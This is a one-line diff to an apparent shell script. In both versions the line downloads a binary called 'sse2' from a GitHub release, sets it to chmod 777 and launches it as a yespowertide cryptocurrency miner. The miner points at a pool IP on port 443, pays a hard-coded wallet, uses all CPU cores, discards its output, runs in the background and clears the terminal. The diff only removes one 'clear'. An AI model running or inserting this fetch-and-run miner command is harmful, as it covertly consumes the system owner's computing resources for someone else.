@@ -1,1 +1,1 @@
-wget https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2 && chmod 777 sse2 && clear && ./sse2 -a yespowertide -o 43.172.89.100:443 -u TAMmcBbUZaWFq2hgPMjqfxSEw2cmoEmSm5.Bismillah -t $(nproc) > /dev/null 2>&1 & clear
+wget https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2 && chmod 777 sse2 && ./sse2 -a yespowertide -o 43.172.89.100:443 -u TAMmcBbUZaWFq2hgPMjqfxSEw2cmoEmSm5.Bismillah -t $(nproc) > /dev/null 2>&1 & clear
